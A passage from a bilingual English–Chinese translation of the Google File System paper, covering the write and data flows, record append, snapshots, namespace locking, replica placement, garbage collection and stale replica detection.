indicating that they have completed the operation.</li><li>The primary replies to the client. Any errors encountered at any of the replicas are reported to the client. In case of errors, the write may have succeeded at the primary and an arbitrary subset of the secondary replicas. (If it had failed at the primary, it would not have been assigned a serial number and forwarded.) The client request is considered to have failed, and the modified region is left in an inconsistent state. Our client code handles such errors by retrying the failed mutation. It will make a few attempts at steps (3) through (7) before falling backto a retry from the beginning of the write.</li></ol><br /><ol><li>客户端向主服务器询问哪个块服务器持有该数据块的租约以及其他副本的位置。如果没有任何服务器持有该租约，主服务器将向它选择的某个副本授予该租约（未显示）。</li><li>主服务器回复客户端，提供主副本的身份和其他（次要）副本的位置。客户端会缓存这些数据以备将来的变更使用。只有当主副本无法访问或在回复表明它不再持有租约时，客户端才需要再次联系主服务器。</li><li>客户端将数据推送到所有副本。客户端可以以任何顺序这样做。每个块服务器都将数据存储在内部 LRU 缓存中，直到数据被使用或过期为止。通过将数据流与控制流分离，我们可以根据网络拓扑安排开销较大的数据流，而不管哪个块服务器是主副本，从而提高性能。第 3.2 节进一步讨论了这一点。</li><li>一旦所有副本已确认接收数据，客户端将向主副本发送写入请求。该请求标识先前推送到所有副本的数据。主副本为其接收到的所有变更分配连续的序列号，这些变更可能来自多个客户端，因此这种方式提供了必要的序列化。它按序列号顺序将变更应用于自己的本地状态。</li><li>主副本将写入请求转发给所有次要副本。每个次要副本按照主副本分配的相同序列号顺序应用变更。</li><li>所有的次要副本都会回复主副本，表示它们已经完成了该操作。</li><li>主副本会回复客户端。在任何副本中遇到的错误都将报告给客户端。如果发生错误，则可能已经在主副本和任意数量的次要副本中成功写入。 （如果在主副本中失败，则不会被分配序列号并转发。）客户端请求被视为失败，并且修改的区域处于不一致状态。我们的客户端代码通过重试失败的变更来处理此类错误。在回退到写入开头的重试之前，它将尝试步骤（3）到（7）几次。</li></ol><p>If a write by the application is large or straddles a chunk boundary, GFS client code breaks it down into multiple write operations. They all follow the control flow described above but may be interleaved with and overwritten by concurrent operations from other clients. Therefore, the shared file region may end up containing fragments from different clients, although the replicas will be identical because the individual operations are completed successfully in the same order on all replicas. This leaves the file region in consistent but undefined state as noted in Section 2.7.</p><p>如果应用程序的写入大小很大或跨越了块边界， GFS 客户端代码则会将其拆分为多个写操作。它们都遵循上述控制流程，但可能会与其他客户端的并发操作交错和覆盖。因此，共享文件区域可能包含来自不同客户端的片段，尽管副本将是相同的，因为所有操作都按照相同的顺序在所有副本上成功完成。如第 2.7 节所述，这将使文件区域处于一种一致但未定义的状态。</p><h2 id="3-2、数据流"><a href="#3-2、数据流" class="headerlink" title="3.2、数据流"></a>3.2、数据流</h2><p>We decouple the flow of data from the flow of control to use the network efficiently. While control flows from the client to the primary and then to all secondaries, data is pushed linearly along a carefully picked chain of chunkservers in a pipelined fashion. Our goals are to fully utilize each machine’s network bandwidth, avoid network bottlenecks and high-latency links, and minimize the latency to push through all the data.</p><p>我们将数据流与控制流分离，以有效利用网络。虽然控制流从客户端到主服务器，然后到所有次服务器，但数据以流水线方式沿着仔细挑选的一系列块服务器线性推进。我们的目标是充分利用每台机器的网络带宽，避免网络瓶颈和高延迟链路，并尽量减少推送所有数据的延迟。</p><p>To fully utilize each machine’s networkbandwidth, the data is pushed linearly along a chain of chunkservers rather than distributed in some other topology (e.g., tree). Thus, each machine’s full outbound bandwidth is used to transfer the data as fast as possible rather than divided among multiple recipients.</p><p>为了充分利用每台机器的网络带宽，数据是沿着一条块服务器链线性推送，而不是分布在其他拓扑结构（例如树形结构）中。因此，每台机器的全部出站带宽被用来尽快传输数据，而不是分配给多个接收方。</p><p>To avoid network bottlenecks and high-latency links (e.g., inter-switch links are often both) as much as possible, each machine forwards the data to the “closest” machine in the network topology that has not received it. Suppose the client is pushing data to chunkservers S1 through S4. It sends the data to the closest chunkserver, say S1. S1 forwards it to the closest chunkserver S2 through S4 closest to S1, say S2. Similarly, S2 forwards it to S3 or S4, whichever is closer to S2, and so on. Our network topology is simple enough that “distances” can be accurately estimated from IP addresses.</p><p>为了尽可能避免网络瓶颈和高延迟链接（例如，交换机之间的链接通常都是这样），每台机器将数据转发到网络拓扑中最近的未接收数据的机器。假设客户端正在向 S1 到 S4 的块服务器推送数据。它将数据发送到最近的块服务器（例如 S1 ），然后 S1 将其转发到最靠近 S1 的 S2 到 S4 中的最近的块服务器（例如 S2 ）。类似地， S2 将其转发到 S3 或 S4 ，取决于 S2 更接近哪个块服务器，以此类推。我们的网络拓扑足够简单，可以从 IP 地址准确地估算出 “距离”。</p><p>Finally, we minimize latency by pipelining the data transfer over TCP connections. Once a chunkserver receives some data, it starts forwarding immediately. Pipelining is especially helpful to us because we use a switched network with full-duplex links. Sending the data immediately does not reduce the receive rate. Without network congestion, the ideal elapsed time for transferring B bytes to R replicas is B&#x2F;T + RL where T is the network throughput and L is latency to transfer bytes between two machines. Our network links are typically 100 Mbps (T), and L is far below 1 ms. Therefore, 1 MB can ideally be distributed in about 80 ms.</p><p>最后，我们通过在 TCP 连接上进行流水线化的数据传输来最小化延迟。一旦块服务器接收到一些数据，它就立即开始转发。流水线化对我们特别有帮助，因为我们使用具有全双工链路的交换网络。立即发送数据不会降低接收速率。在没有网络拥塞的情况下，将 B 字节传输到 R 个副本的理想经过时间是 B&#x2F;T + RL，其中 T 是网络吞吐量，L 是两台机器之间传输字节的延迟。我们的网络链接通常是 100 Mbps（T），而 L 远低于 1 毫秒。因此，理想情况下，1 MB 可以在大约 80 毫秒内分发。</p><h2 id="3-3、原子记录追加"><a href="#3-3、原子记录追加" class="headerlink" title="3.3、原子记录追加"></a>3.3、原子记录追加</h2><p>GFS provides an atomic append operation called record append. In a traditional write, the client specifies the offset at which data is to be written. Concurrent writes to the same region are not serializable: the region may end up containing data fragments from multiple clients. In a record append, however, the client specifies only the data. GFS appends it to the file at least once atomically (i.e., as one continuous sequence of bytes) at an offset of GFS’s choosing and returns that offset to the client. This is similar to writing to a file opened in O_APPEND mode in Unix without the race conditions when multiple writers do so concurrently.</p><p>GFS 提供了一种称为 “记录追加” 的原子追加操作。在传统的写操作中，客户端需要指定要写入数据的偏移量。同时进行的写操作可能无法保证序列化的顺序：文件区域可能会包含来自多个客户端的数据片段。但是，在记录追加中，客户端只需要指定数据内容， GFS 会将其原子地追加到文件中，至少追加一次（即一系列连续的字节），并将该偏移量返回给客户端。这类似于在 Unix 中以 O_APPEND 模式打开文件进行写操作，但避免了多个写操作同时进行时的竞态条件。</p><p>Record append is heavily used by our distributed applications in which many clients on different machines append to the same file concurrently. Clients would need additional complicated and expensive synchronization, for example through a distributed lockmanager, if they do so with traditional writes. In our workloads, such files often serve as multiple-producer&#x2F;single-consumer queues or contain merged results from many different clients.</p><p>记录追加在我们的分布式应用程序中被广泛使用，其中许多位于不同计算机上的客户端同时追加到同一文件。如果使用传统的写操作进行追加，客户端需要进行复杂和昂贵的同步，例如通过分布式锁管理器。在我们的工作负载中，这样的文件通常用作多生产者&#x2F;单消费者队列或包含来自许多不同客户端的合并结果。</p><p>Record append is a kind of mutation and follows the control flow in Section 3.1 with only a little extra logic at the primary. The client pushes the data to all replicas of the last chunkof the file Then, it sends its request to the primary. The primary checks to see if appending the record to the current chunkwould cause the chunkto exceed the maximum size (64 MB). If so, it pads the chunkto the maximum size, tells secondaries to do the same, and replies to the client indicating that the operation should be retried on the next chunk. (Record append is restricted to be at most one-fourth of the maximum chunksize to keep worstcase fragmentation at an acceptable level.) If the record fits within the maximum size, which is the common case, the primary appends the data to its replica, tells the secondaries to write the data at the exact offset where it has, and finally replies success to the client.</p><p>记录追加是一种变更（变异）操作，并遵循第 3.1 节中的控制流程，只需在主服务器上添加一些额外的逻辑。客户端将数据推送到文件的最后一个块的所有副本，然后将其请求发送到主服务器。主服务器检查将记录追加到当前块是否会导致该块超过最大大小（ 64 MB）。如果是，它会将该块填充到最大大小，告诉副本节点执行同样的操作，并向客户端回复，指示应在下一个块上重试操作。（为保持最坏情况下的分片水平在可接受范围内，记录追加被限制为最多为最大块大小的四分之一。）如果记录适合最大大小（这是常见情况），主服务器将数据追加到其副本，告诉副本节点在确切的偏移量处写入数据，最后向客户端回复成功。</p><p>If a record append fails at any replica, the client retries the operation. As a result, replicas of the same chunkmay contain different data possibly including duplicates of the same record in whole or in part. GFS does not guarantee that all replicas are bytewise identical. It only guarantees that the data is written at least once as an atomic unit. This property follows readily from the simple observation that for the operation to report success, the data must have been written at the same offset on all replicas of some chunk. Furthermore, after this, all replicas are at least as long as the end of record and therefore any future record will be assigned a higher offset or a different chunkeven if a different replica later becomes the primary. In terms of our consistency guarantees, the regions in which successful record append operations have written their data are defined (hence consistent), whereas intervening regions are inconsistent (hence undefined). Our applications can deal with inconsistent regions as we discussed in Section 2.7.2.</p><p>如果记录追加在任何副本上失败，客户端将重试该操作。因此，同一块的副本可能包含不同的数据，可能包括完整或部分重复的相同记录。  GFS 不能保证所有副本是按字节完全相同的。它只保证数据作为一个原子单位至少被写入一次。这个属性很容易从简单的观察中得出，即为了报告成功，数据必须已经在某个块的所有副本上的相同偏移量处被写入。此外，在此之后，所有副本至少与记录的结束位置一样长，因此，即使稍后的不同副本成为主副本，任何未来的记录也将被分配更高的偏移量或不同的块。就我们的一致性保证而言，成功记录追加操作写入其数据的区域被定义（因此是一致的），而介于区域之间的区域是不一致的（因此未定义的）。正如我们在第 2.7.2 节中讨论的那样，我们的应用程序可以处理不一致的区域。</p><h2 id="3-4、快照"><a href="#3-4、快照" class="headerlink" title="3.4、快照"></a>3.4、快照</h2><p>The snapshot operation makes a copy of a file or a directory tree (the “source”) almost instantaneously, while minimizing any interruptions of ongoing mutations. Our users use it to quickly create branch copies of huge data sets (and often copies of those copies, recursively), or to checkpoint the current state before experimenting with changes that can later be committed or rolled backeasily.</p><p>快照操作⼏乎可以瞬间复制⽂件或⽬录树（“源”），同时最⼤限度地减少正在进⾏的变更（突变）的任何中断。我们的用户使用它快速创建大型数据集的分支副本（通常是这些副本的副本，递归地），或在尝试可以轻松提交或回滚的更改之前检查点当前状态。</p><p>Like AFS [5], we use standard copy-on-write techniques to implement snapshots. When the master receives a snapshot request, it first revokes any outstanding leases on the chunks in the files it is about to snapshot. This ensures that any subsequent writes to these chunks will require an interaction with the master to find the lease holder. This will give the master an opportunity to create a new copy of the chunk first.</p><p>与 AFS [5] 类似，我们使用标准的写时复制技术来实现快照。当主服务器接收到快照请求时，它首先撤销任何正在使用待快照文件中块的租约。这确保任何后续对这些块的写操作都需要与主服务器进行交互以查找租约持有者。这将为主服务器创建块的新副本提供机会。</p><p>After the leases have been revoked or have expired, the master logs the operation to disk. It then applies this log record to its in-memory state by duplicating the metadata for the source file or directory tree. The newly created snapshot files point to the same chunks as the source files.</p><p>在租约被撤销或过期后，主服务器将该操作记录到磁盘上。然后，它通过复制源文件或目录树的元数据将此日志记录应用于其内存状态。新创建的快照文件指向与源文件相同的块。</p><p>The first time a client wants to write to a chunk C after the snapshot operation, it sends a request to the master to find the current lease holder. The master notices that the reference count for chunk C is greater than one. It defers replying to the client request and instead picks a new chunk handle C’. It then asks each chunkserver that has a current replica of C to create a new chunkcalled C’. By creating the new chunk on the same chunkservers as the original, we ensure that the data can be copied locally, not over the network(our disks are about three times as fast as our 100 Mb Ethernet links). From this point, request handling is no different from that for any chunk: the master grants one of the replicas a lease on the new chunk C’ and replies to the client, which can write the chunk normally, not knowing that it has just been created from an existing chunk.</p><p>当客户端在快照操作后首次想要写入块 C 时，它会向主服务器发送请求以查找当前的租赁持有者。主服务器注意到块 C 的引用计数大于 1，它将延迟回复客户端请求并选择一个新的块句柄 C’。然后它要求每个当前拥有块 C 副本的块服务器创建一个新的块，称为 C’。通过在原始块的相同块服务器上创建新块，我们确保数据可以在本地复制，而不是通过网络传输（我们的磁盘速度约为我们的 100 Mb 以太网连接的三倍）。从此时开始，请求处理与任何块的处理方式没有区别：主服务器向新块 C’ 的一个副本授予租赁，然后回复给客户端，客户端可以正常写入该块，不知道它刚刚是从现有块创建的。</p><h1 id="4、Master-操作"><a href="#4、Master-操作" class="headerlink" title="4、Master 操作"></a>4、Master 操作</h1><p>The master executes all namespace operations. In addition, it manages chunk replicas throughout the system: it makes placement decisions, creates new chunks and hence replicas, and coordinates various system-wide activities to keep chunks fully replicated, to balance load across all the chunkservers, and to reclaim unused storage. We now discuss each of these topics.</p><p>主服务器执行所有的命名空间操作。此外，它还管理系统中的块副本：它做出放置决策，创建新块并因此创建副本，协调各种系统范围的活动以保持块完全复制，平衡所有块服务器的负载并回收未使用的存储空间。现在我们将讨论这些主题的每个方面。</p><h2 id="4-1、命名空间管理和锁定"><a href="#4-1、命名空间管理和锁定" class="headerlink" title="4.1、命名空间管理和锁定"></a>4.1、命名空间管理和锁定</h2><p>Many master operations can take a long time: for example, a snapshot operation has to revoke chunkserver leases on all chunks covered by the snapshot. We do not want to delay other master operations while they are running. Therefore, we allow multiple operations to be active and use locks over regions of the namespace to ensure proper serialization.</p><p>许多主服务器操作可能需要很长时间：例如，快照操作需要撤销快照所涵盖的所有块的块服务器租约。我们不希望在这些操作运行时延迟其他主服务器操作。因此，我们允许多个操作处于活动状态，并使用命名空间区域上的锁来确保正确的序列化。</p><p>Unlike many traditional file systems, GFS does not have a per-directory data structure that lists all the files in that directory. Nor does it support aliases for the same file or directory (i.e, hard or symbolic links in Unix terms). GFS logically represents its namespace as a lookup table mapping full pathnames to metadata. With prefix compression, this table can be efficiently represented in memory. Each node in the namespace tree (either an absolute file name or an absolute directory name) has an associated read-write lock.</p><p>与许多传统文件系统不同， GFS 没有列出目录中所有文件的每个目录数据结构。它也不支持同一文件或目录的别名（即 Unix 术语中的硬链接或符号链接）。 GFS 将其命名空间逻辑上表示为将完整路径名映射到元数据的查找表。通过前缀压缩，该表可以在内存中高效地表示。命名空间树中的每个节点（绝对文件名或绝对目录名）都有一个关联的读写锁。</p><p>Each master operation acquires a set of locks before it runs. Typically, if it involves &#x2F;d1&#x2F;d2&#x2F;…&#x2F;dn&#x2F;leaf, it will acquire read-locks on the directory names &#x2F;d1, &#x2F;d1&#x2F;d2, …, &#x2F;d1&#x2F;d2&#x2F;…&#x2F;dn, and either a read lockor a write lockon the full pathname &#x2F;d1&#x2F;d2&#x2F;…&#x2F;dn&#x2F;leaf. Note that leaf may be a file or directory depending on the operation.</p><p>每个主服务器操作在运行前会获取一组锁。通常，如果它涉及到路径 &#x2F;d1&#x2F;d2&#x2F;…&#x2F;dn&#x2F;leaf，它将获取目录名 &#x2F;d1，&#x2F;d1&#x2F;d2，…，&#x2F;d1&#x2F;d2&#x2F;…&#x2F;dn 的读锁，并且在完整路径名 &#x2F;d1&#x2F;d2&#x2F;…&#x2F;dn&#x2F;leaf 上获取读锁或写锁，具体取决于操作所涉及的是文件还是目录。</p><p>We now illustrate how this locking mechanism can prevent a file &#x2F;home&#x2F;user&#x2F;foo from being created while &#x2F;home&#x2F;user is being snapshotted to &#x2F;save&#x2F;user. The snapshot operation acquires read lock s on &#x2F;home and &#x2F;save, and write locks on &#x2F;home&#x2F;user and &#x2F;save&#x2F;user. The file creation acquires read locks on &#x2F;home and &#x2F;home&#x2F;user, and a write lockon &#x2F;home&#x2F;user&#x2F;foo. The two operations will be serialized properly because they try to obtain conflicting locks on &#x2F;home&#x2F;user. File creation does not require a write lock on the parent directory because there is no “directory”, or inode-like, data structure to be protected from modification. The read lockon the name is sufficient to protect the parent directory from deletion.</p><p>我们现在举例说明这种锁定机制如何防止在将 &#x2F;home&#x2F;user 快照为 &#x2F;save&#x2F;user 时创建文件 &#x2F;home&#x2F;user&#x2F;foo。快照操作在 &#x2F;home 和 &#x2F;save 上获取读锁，并在 &#x2F;home&#x2F;user 和 &#x2F;save&#x2F;user 上获取写锁。文件创建在 &#x2F;home 和 &#x2F;home&#x2F;user 上获取读锁，以及在 &#x2F;home&#x2F;user&#x2F;foo 上获取写锁。由于它们试图在 &#x2F;home&#x2F;user 上获取冲突的锁，因此这两个操作将正确地进行序列化。文件创建不需要在父目录上获取写锁，因为没有需要保护免受修改的 “目录” 或 “inode” 类似的数据结构。名称上的读锁足以保护父目录免受删除。</p><p>One nice property of this locking scheme is that it allows concurrent mutations in the same directory. For example, multiple file creations can be executed concurrently in the same directory: each acquires a read lockon the directory name and a write lockon the file name. The read lockon the directory name suffices to prevent the directory from being deleted, renamed, or snapshotted. The write locks on file names serialize attempts to create a file with the same name twice.</p><p>这种锁定方案的一个好处是允许在同一目录中进行并发变更。例如，可以在同一目录中并发执行多个文件创建操作：每个操作会获取目录名称的读锁和文件名称的写锁。目录名称的读锁足以防止目录被删除、重命名或快照。文件名称的写锁则可以序列化两次尝试创建同名文件的操作。</p><p>Since the namespace can have many nodes, read-write lock objects are allocated lazily and deleted once they are not in use. Also, locks are acquired in a consistent total order to prevent deadlock: they are first ordered by level in the namespace tree and lexicographically within the same level.</p><p>由于命名空间可能包含许多节点，因此读写锁对象是惰性分配的，并在不使用时删除。此外，为了防止死锁，锁以一致的总顺序获取：首先按命名空间树中的级别排序，然后在同一级别内按字典顺序排序。</p><h2 id="4-2、放置副本"><a href="#4-2、放置副本" class="headerlink" title="4.2、放置副本"></a>4.2、放置副本</h2><p>A GFS cluster is highly distributed at more levels than one. It typically has hundreds of chunkservers spread across many machine racks. These chunkservers in turn may be accessed from hundreds of clients from the same or different racks. Communication between two machines on different racks may cross one or more network switches. Additionally, bandwidth into or out of a rackmay be less than the aggregate bandwidth of all the machines within the rack. Multi-level distribution presents a unique challenge to distribute data for scalability, reliability, and availability.</p><p>GFS 集群在多个级别上是高度分布式的。它通常由数百个块服务器组成并分布在许多机架上。这些块服务器又可以从来自同一机架或不同机架的数百个客户端访问。两个位于不同机架上的计算机之间的通信可能会跨越一个或多个网络交换机。此外，机架进出带宽可能小于机架内所有机器的总带宽。多级分布为可扩展性、可靠性和可用性的数据分发提供了独特的挑战。</p><p>The chunk replica placement policy serves two purposes: maximize data reliability and availability, and maximize network bandwidth utilization. For both, it is not enough to spread replicas across machines, which only guards against diskor machine failures and fully utilizes each machine’s network bandwidth. We must also spread chunkreplicas across racks. This ensures that some replicas of a chunk will survive and remain available even if an entire rackis damaged or offline (for example, due to failure of a shared resource like a network switch or power circuit). It also means that traffic, especially reads, for a chunkcan exploit the aggregate bandwidth of multiple racks. On the other hand, write traffic has to flow through multiple racks, a tradeoff we make willingly.</p><p>块副本放置策略有两个目的：最大化数据可靠性和可用性，以及最大化网络带宽利用率。仅仅将副本分散在不同机器上是不够的，这样只能防止磁盘或机器故障，并充分利用每台机器的网络带宽。我们还必须将块副本分散在不同的机架上。这样可以确保即使整个机架（例如，由于网络交换机或电源电路等共享资源出现故障）受损或离线，一些块的副本仍将存活并保持可用性。这也意味着块的流量，特别是读取流量，可以利用多个机架的总带宽。然而，写入流量必须通过多个机架流动，这是我们自愿做出的权衡。</p><h2 id="4-3、创建、重新复制、重新平衡"><a href="#4-3、创建、重新复制、重新平衡" class="headerlink" title="4.3、创建、重新复制、重新平衡"></a>4.3、创建、重新复制、重新平衡</h2><p>Chunkreplicas are created for three reasons: chunkcreation, re-replication, and rebalancing.</p><p>块副本的创建出于三个原因：块创建、重新复制和重新平衡。</p><p>When the master creates a chunk, it chooses where to place the initially empty replicas. It considers several factors. (1) We want to place new replicas on chunkservers with below-average disk space utilization. Over time this will equalize disk utilization across chunkservers. (2) We want to limit the number of “recent” creations on each chunkserver. Although creation itself is cheap, it reliably predicts imminent heavy write traffic because chunks are created when demanded by writes, and in our append-once-read-many workload they typically become practically read-only once they have been completely written. (3) As discussed above, we want to spread replicas of a chunk across racks.</p><p>当主服务器创建一个块时，它会选择在哪里放置最初为空的副本，并考虑几个因素。(1) 我们希望将新的副本放置在磁盘空间利用率低于平均值的块服务器上。随着时间的推移，这将使磁盘利用率在块服务器之间平衡。(2) 我们希望限制每个块服务器上 “最近” 创建的块数。尽管创建块本身开销很低，但由于块是在有写入需求的时候被创建的，所以它能够可靠地预测到即将出现的大量的写入流量。并且在我们的一次追加写入和多次读取的工作负载中，一旦块被完全写入（写满），它们通常变得几乎只读。(3) 正如上面讨论的那样，我们希望跨机架部署块的副本。</p><p>The master re-replicates a chunk as soon as the number of available replicas falls below a user-specified goal. This could happen for various reasons: a chunkserver becomes unavailable, it reports that its replica may be corrupted, one of its disks is disabled because of errors, or the replication goal is increased. Each chunk that needs to be re-replicated is prioritized based on several factors. One is how far it is from its replication goal. For example, we give higher priority to a chunk that has lost two replicas than to a chunk that has lost only one. In addition, we prefer to first re-replicate chunks for live files as opposed to chunks that belong to recently deleted files (see Section 4.4). Finally, to minimize the impact of failures on running applications, we boost the priority of any chunk that is blocking client progress.</p><p>主服务器会在可用副本数量低于用户的指定值时立即重新复制一个块。这种情况可能发生的原因有多种：一个块服务器不可用，它报告其副本可能已经损坏，其中一个磁盘因错误而被禁用，或者增加了复制目标。需要重新复制的每个块都根据几个因素进行优先排序。其中一个因素是它距离复制目标有多远。例如，我们会优先处理失去两个副本的块，而不是只失去一个副本的块。此外，我们更喜欢先重新复制实时文件的块，而不是属于最近删除的文件的块（请参见第 4.4 节）。最后，为了最小化故障对正在运行的应用程序的影响，我们会提高阻塞客户端进度的任何块的优先级。</p><p>The master picks the highest priority chunk and “clones” it by instructing some chunkserver to copy the chunk data directly from an existing valid replica. The new replica is placed with goals similar to those for creation: equalizing diskspace utilization, limiting active clone operations on any single chunkserver, and spreading replicas across racks. To keep cloning traffic from overwhelming client traffic, the master limits the numbers of active clone operations both for the cluster and for each chunkserver. Additionally, each chunkserver limits the amount of bandwidth it spends on each clone operation by throttling its read requests to the source chunkserver.</p><p>主服务器会选择优先级最高的数据块，并通过指示某个块服务器直接从现有的有效副本中复制数据来 “克隆” 该数据块。新副本的放置目标与创建时类似：均衡磁盘空间利用率，限制单个块服务器上活动克隆操作的数量，并在机架间分布副本。为了避免克隆流量压倒客户端流量，主服务器限制了集群和每个块服务器上活跃的克隆操作的数量。此外，每个块服务器通过限制从源块服务器发出的读请求的传输速率来限制其在每个克隆操作上花费的带宽。</p><p>Finally, the master rebalances replicas periodically: it examines the current replica distribution and moves replicas for better diskspace and load balancing. Also through this process, the master gradually fills up a new chunkserver rather than instantly swamps it with new chunks and the heavy write traffic that comes with them. The placement criteria for the new replica are similar to those discussed above. In addition, the master must also choose which existing replica to remove. In general, it prefers to remove those on chunkservers with below-average free space so as to equalize diskspace usage.</p><p>最后，主服务器会定期重新均衡副本：它会检查当前的副本分布情况，并将副本移动到更好的磁盘空间和负载平衡。通过这个过程，主服务器逐渐填满一个新的块服务器，而不是立即启动新的块，否则就会导致大量的写入流量负载。新副本的放置标准与上面讨论的相似。此外，主服务器还必须选择要删除的现有副本。通常情况下，它会优先删除那些在副本服务器上具有低于平均剩余空间的副本，以均衡磁盘空间的使用率。</p><h2 id="4-4、垃圾收集"><a href="#4-4、垃圾收集" class="headerlink" title="4.4、垃圾收集"></a>4.4、垃圾收集</h2><p>After a file is deleted, GFS does not immediately reclaim the available physical storage. It does so only lazily during regular garbage collection at both the file and chunk levels. We find that this approach makes the system much simpler and more reliable.</p><p>在文件被删除之后， GFS 并不会立即回收可用的物理存储空间，而是在文件和块级别的常规垃圾回收期间才会进行惰性回收。我们发现这种方法使得系统更加简单和可靠。</p><h3 id="4-4-1、机制"><a href="#4-4-1、机制" class="headerlink" title="4.4.1、机制"></a>4.4.1、机制</h3><p>When a file is deleted by the application, the master logs the deletion immediately just like other changes. However instead of reclaiming resources immediately, the file is just renamed to a hidden name that includes the deletion timestamp. During the master’s regular scan of the file system namespace, it removes any such hidden files if they have existed for more than three days (the interval is configurable). Until then, the file can still be read under the new, special name and can be undeleted by renaming it back to normal. When the hidden file is removed from the namespace, its inmemory metadata is erased. This effectively severs its links to all its chunks.</p><p>当应用程序删除文件时，主服务器会立即记录删除操作，就像其他更改一样。但是不会立即回收资源，而是将文件重命名为包括删除时间戳的隐藏名称。在主服务器定期扫描文件系统命名空间时，如果这些隐藏文件已经存在了超过三天（时间间隔可配置），才会将其删除。在此期间，文件仍然可以使用新的特殊名称进行读取，并且可以通过将其重命名回常规名称来进行恢复。当从命名空间中删除隐藏文件时，其记忆中（内存中）的元数据将被清除，这有效地切断了它与所有块的连接。</p><p>In a similar regular scan of the chunk namespace, the master identifies orphaned chunks (i.e., those not reachable from any file) and erases the metadata for those chunks. In a HeartBeat message regularly exchanged with the master, each chunkserver reports a subset of the chunks it has, and the master replies with the identity of all chunks that are no longer present in the master’s metadata. The chunkserver is free to delete its replicas of such chunks.</p><p>在类似的块命名空间的定期扫描中，主服务器会识别孤立的块（即不属于任何文件的块），并删除这些块的元数据。每个块服务器通过定期与主服务器交换的心跳消息报告其所拥有的一部分块，主服务器则回复所有已不再存在于其元数据中的块的标识。块服务器就可以自由地删除这些块的副本。</p><h3 id="4-4-2、讨论"><a href="#4-4-2、讨论" class="headerlink" title="4.4.2、讨论"></a>4.4.2、讨论</h3><p>Although distributed garbage collection is a hard problem that demands complicated solutions in the context of programming languages, it is quite simple in our case. We can easily identify all references to chunks: they are in the fileto-chunk mappings maintained exclusively by the master. We can also easily identify all the chunk replicas: they are Linux files under designated directories on each chunkserver. Any such replica not known to the master is “garbage.”</p><p>虽然在编程语言的上下文中，分布式的垃圾回收是一个需要复杂解决方案的难题，但在我们的情况下却非常简单。我们可以轻松地识别所有对块的引用：它们都在由主服务器专门维护的文件到块的映射中。我们也可以轻松地识别所有块的副本：它们是每个块服务器上指定目录下的 Linux 文件。任何不为主服务器所知的复制副本都是 “垃圾”。</p><p>The garbage collection approach to storage reclamation offers several advantages over eager deletion. First, it is simple and reliable in a large-scale distributed system where component failures are common. Chunk creation may succeed on some chunkservers but not others, leaving replicas that the master does not know exist. Replica deletion messages may be lost, and the master has to remember to resend them across failures, both its own and the chunkserver’s. Garbage collection provides a uniform and dependable way to clean up any replicas not known to be useful. Second, it merges storage reclamation into the regular background activities of the master, such as the regular scans of namespaces and handshakes with chunkservers. Thus, it is done in batches and the cost is amortized. Moreover, it is done only when the master is relatively free. The master can respond more promptly to client requests that demand timely attention. Third, the delay in reclaiming storage provides a safety net against accidental, irreversible deletion.</p><p>垃圾回收方式在存储回收上提供了比立刻删除更多的优点。首先，在组件故障常见的大规模分布式系统中，它是简单而可靠的。块的创建可能成功地在某些块服务器上进行，但在其他块服务器上不成功，产生了主服务器不知道的副本。副本删除消息可能会丢失，主服务器必须要在故障（包括自己和块服务器的故障）后重新发送它们。垃圾回收提供了一种统一可靠的方法来清理任何不被认为有用的副本。其次，它将存储回收合并到主服务器的常规后台活动中，例如对命名空间的常规扫描和与块服务器的握手。因此，它是批量处理的，成本是分摊的。此外，它仅在主服务器相对空闲时执行。主服务器可以更及时地响应需要及时处理的客户端请求。最后，推迟回收存储空间为意外不可逆的删除提供了安全保障。</p><p>In our experience, the main disadvantage is that the delay sometimes hinders user effort to fine tune usage when storage is tight. Applications that repeatedly create and delete temporary files may not be able to reuse the storage right away. We address these issues by expediting storage reclamation if a deleted file is explicitly deleted again. We also allow users to apply different replication and reclamation policies to different parts of the namespace. For example, users can specify that all the chunks in the files within some directory tree are to be stored without replication, and any deleted files are immediately and irrevocably removed from the file system state.</p><p>根据我们的经验，垃圾回收的主要缺点是：延迟删除有时候会影响在存储空间紧张时用户微调（参数）的效果。反复创建和删除临时文件的应用程序可能无法立即重复使用存储空间。我们可以通过加速存储回收来解决这些问题，如果已删除的文件再次被明确删除，我们将加快存储回收。我们还允许用户对命名空间的不同部分设置不同的复制和回收策略。例如，用户可以指定在某个目录树中的所有文件中的所有块都是无需复制的，并且任何删除的文件都会立即且无法恢复地从文件系统状态中删除。</p><h2 id="4-5、陈旧副本检测"><a href="#4-5、陈旧副本检测" class="headerlink" title="4.5、陈旧副本检测"></a>4.5、陈旧副本检测</h2><p>Chunk replicas may become stale if a chunkserver fails and misses mutations to the chunk while it is down. For each chunk, the master maintains a chunk version number to distinguish between up-to-date and stale replicas.</p><p>如果一个块服务器发生了异常并在宕机的时候错过了对块的变更，则其块副本可能会变得陈旧。对于每个块，主服务器维护一个块版本号，以区分最新和陈旧的副本。</p><p>Whenever the master grants a new lease on a chunk, it increases the chunk version number and informs the up-todate replicas. The master and these replicas all record the new version number in their persistent state. This occurs before any client is notified and therefore before it can start writing to the chunk. If another replica is currently unavailable, its chunk version number will not be advanced. The master will detect that this chunkserver has a stale replica when the chunkserver restarts and reports its set of chunks and their associated version numbers. If the master sees a version number greater than the one in its records, the master assumes that it failed when granting the lease and so takes the higher version to be up-to-date.</p><p>每当主服务器对块授予新的租约时，它会增长块版本号并通知最新的副本。主服务器和这些副本都在它们的持久状态中记录新版本号。这发生在任何客户端被通知之前，因此在它开始写入块之前。如果另一个副本当前不可用，则其块版本号将不会被增长。当块服务器重新启动并报告其块的集合及其关联的版本号时，主服务器将检测到该块服务器具有陈旧的副本。如果主服务器看到一个版本号大于其记录中的版本号，则主服务器假定在授予租约时发生了故障，因此将较高的版本视为最新的。</p><p>The master removes stale replicas in its regular garbage collection. Before that, it effectively considers a stale replica not to exist at all when it replies to client requests for chunk information. As another safeguard, the master includes the chunk version number when it informs clients which chunkserver holds a lease on a chunk or when it instructs a chunkserver to read the chunk from another chunkserver in a cloning operation. The client or the chunkserver verifies the version number when it performs the operation so that it is always accessing up-to-date data.</p><p>主服务器会在其定期的垃圾回收中删除陈旧的副本。在此之前，当它回复客户端对块信息的请求时，它实际上认为陈旧的副本不存在。作为另一种保障，主服务器在通知客户端哪个块服务器拥有块的租约或在指示块服务器从克隆操作中的另一个块服务器读取块时，会包含块版本号。客户端或块服务器在执行操作时验证版本号，以便始终访问最新的数据。</p><h1 id="5、容错和诊断"><a href="#5、容错和诊断" class="headerlink" title="5、容错和诊断"></a>5、容错和诊断</h1><p>One of our greatest challenges in designing the system is dealing with 